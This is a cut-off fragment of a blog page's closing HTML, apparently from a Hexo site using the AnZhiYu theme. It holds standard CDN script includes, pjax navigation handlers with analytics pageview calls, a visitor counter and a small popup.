href="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors=['meta[property="og:image"]','meta[property="og:title"]','meta[property="og:url"]','meta[property="og:type"]','meta[property="og:site_name"]','meta[property="og:description"]',"head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!0,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(anzhiyu.removeGlobalFnEvent("pjax"),anzhiyu.removeGlobalFnEvent("themeChange"),document.getElementById("rightside").classList.remove("rightside-show"),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach(e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach(e=>t.setAttribute(e.name,e.value)),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)}),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","G-PM5RRNPNEB",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll()})),document.addEventListener("pjax:error",e=>{404===e.request.status&&pjax.loadUrl("/404.html")})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">Reminder</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">Hello!</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>